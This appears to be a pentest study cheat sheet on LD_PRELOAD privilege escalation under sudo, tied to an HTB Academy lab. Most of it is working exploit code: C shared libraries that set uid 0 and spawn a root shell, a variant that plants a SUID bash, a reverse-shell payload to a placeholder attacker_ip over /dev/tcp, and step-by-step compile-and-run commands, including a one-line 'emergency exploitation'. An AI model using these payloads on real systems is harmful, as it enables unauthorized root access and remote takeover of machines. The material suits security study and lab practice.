---
# 📚 Shared Libraries (LD_PRELOAD)

> [!ABSTRACT] Overview of LD_PRELOAD Environment Variable
>
> The `LD_PRELOAD` environment variable allows loading custom shared libraries before program execution, enabling privilege escalation when combined with sudo configurations that preserve environment variables.

---

## 🎯 Overview

[!INFO] **What is LD_PRELOAD?**
The `LD_PRELOAD` environment variable allows users to load custom shared libraries before a program starts executing. This can be exploited for privilege escalation if the system's sudo configuration preserves this environment variable when running commands with elevated privileges.

---

## 🔍 Prerequisites

### Check for LD_PRELOAD in Sudo
```bash
# Check sudo configuration
sudo -l

# Look for env_keep+=LD_PRELOAD in output:
# Example vulnerable entry: (root) NOPASSWD: /usr/sbin/apache2 restart
```

[!NOTE] Important to check if `env_keep` includes `LD_PRELOAD`.

### Library Dependencies Analysis
```bash
# View shared library dependencies
ldd /bin/ls
ldd /usr/sbin/apache2

# Check LD_PRELOAD current value
echo $LD_PRELOAD
```

---

## 🚀 LD_PRELOAD Exploitation

[!EXAMPLE] **Create Malicious Library**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

[!EXAMPLE] **Compile Shared Library**
```bash
# Compile as shared library
gcc -fPIC -shared -o root.so root.c -nostartfiles

# Verify compilation
file root.so
# Output: root.so: ELF 64-bit LSB shared object
```

[!SUCCESS] **Execute Privilege Escalation**
```bash
# Use LD_PRELOAD with sudo command
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

# Should drop to root shell immediately
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 🔧 Alternative Payloads

### Reverse Shell Library
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    system("bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'");
}
```

[!EXAMPLE] **Compile and Execute**
```bash
gcc -fPIC -shared -o revshell.so revshell.c -nostartfiles
sudo LD_PRELOAD=/tmp/revshell.so /allowed/sudo/command
```

### SUID Binary Creation
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");
}
```

[!EXAMPLE] **Compile and Execute**
```bash
gcc -fPIC -shared -o suid.so suid.c -nostartfiles
sudo LD_PRELOAD=/tmp/suid.so /allowed/sudo/command
/tmp/rootbash -p  # Execute SUID bash
```

---

## 🔍 Detection & Enumeration

### LD_PRELOAD Vulnerability Check
```bash
#!/bin/bash
echo "=== LD_PRELOAD VULNERABILITY CHECK ==="

echo "[+] Checking sudo configuration for LD_PRELOAD:"
sudo -l 2>/dev/null | grep -i "LD_PRELOAD"

echo "[+] Current LD_PRELOAD value:"
echo $LD_PRELOAD

echo "[+] Available sudo commands with env_keep:"
sudo -l 2>/dev/null | grep -A 10 "env_keep.*LD_PRELOAD"

echo "[+] Compiler availability:"
which gcc g++ 2>/dev/null
```

[!EXAMPLE] **Environment Variable Analysis**
```bash
# Check all environment variables kept by sudo
sudo -l | grep "env_keep"

# Test LD_PRELOAD functionality
echo 'void _init(){system("echo LD_PRELOAD works");}' > test.c
gcc -fPIC -shared -o test.so test.c -nostartfiles
LD_PRELOAD=./test.so ls  # Should show "LD_PRELOAD works"
```

---

## 🔑 Quick Reference

### Immediate Checks
```bash
# Check for LD_PRELOAD in sudo
sudo -l | grep "LD_PRELOAD"

# Available compilers
which gcc g++

# Sudo commands available
sudo -l | grep "NOPASSWD"
```

[!SUCCESS] **Emergency Exploitation**
```bash
# Quick LD_PRELOAD escalation
echo 'void _init(){unsetenv("LD_PRELOAD");setuid(0);system("/bin/bash");}' > root.c
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=./root.so /allowed/sudo/command
```

### HTB Academy Example
```bash
# 1. Check sudo configuration
sudo -l
# Look for: env_keep+=LD_PRELOAD

# 2. Create malicious library
gcc -fPIC -shared -o root.so root.c -nostartfiles

# 3. Execute with any allowed sudo command
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

# 4. Access flag
cat /root/ld_preload/flag.txt
```

---

*LD_PRELOAD exploitation transforms safe sudo commands into privilege escalation vectors - environment variable preservation combined with shared library injection bypasses command restrictions for immediate root access.*

[!WARNING] **Exploitation Requirements**
- **Sudo access** to any command (even non-GTFOBin)
- **env_keep+=LD_PRELOAD** in `sudoers` configuration
- **GCC compiler** available on target system
- **Write permissions** in accessible directory

### Common Scenarios
- **Non-exploitable sudo commands** with LD_PRELOAD kept
- **Service restart permissions** (apache, nginx, etc.)
- **Safe commands** made dangerous by LD_PRELOAD
- **Custom applications** with sudo permissions